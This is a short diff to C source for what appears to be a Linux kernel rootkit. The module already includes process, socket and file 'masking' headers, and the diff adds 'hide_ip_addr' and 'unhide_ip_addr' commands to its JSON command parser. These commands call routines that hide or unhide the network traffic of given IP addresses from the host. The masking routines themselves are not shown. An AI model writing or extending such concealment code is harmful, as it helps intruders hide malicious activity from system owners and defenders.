@@ -28,7 +28,7 @@
 #include "process_masking.h"	/* Needed for ... */
 #include "socket_masking.h"		/* Needed for ... */
 #include "file_masking.h"
-
+#include "packet_masking.h"
 
 /*******************************************************************************/
 /*                                                                             */
@@ -244,6 +244,22 @@ static int parse_json(char *json_str)
 				printk(KERN_INFO "index %d has value %s\n", j, values[j]);
 				port = simple_strtol(values[j], &endptr, 10);
 				unmask_socket("udp6", port);
+			}
+
+		} else if (!jsoneq(json_str, &t[i], "hide_ip_addr")) {
+			count = extract_array_values(json_str);
+			printk(KERN_INFO "%s: %d\n", "hiding_address", count);
+			for (j=0 ; j<count ; j++) {
+				printk(KERN_INFO "index %d has value %s\n", j, values[j]);
+				mask_ip_traffic(values[j]);
+			}
+
+		} else if (!jsoneq(json_str, &t[i], "unhide_ip_addr")) {
+			count = extract_array_values(json_str);
+			printk(KERN_INFO "%s: %d\n", "unhide_ip_addr", count);
+			for (j=0 ; j<count ; j++) {
+				printk(KERN_INFO "index %d has value %s\n", j, values[j]);
+				unmask_ip_traffic(values[j]);
 			}
 
 		} else {
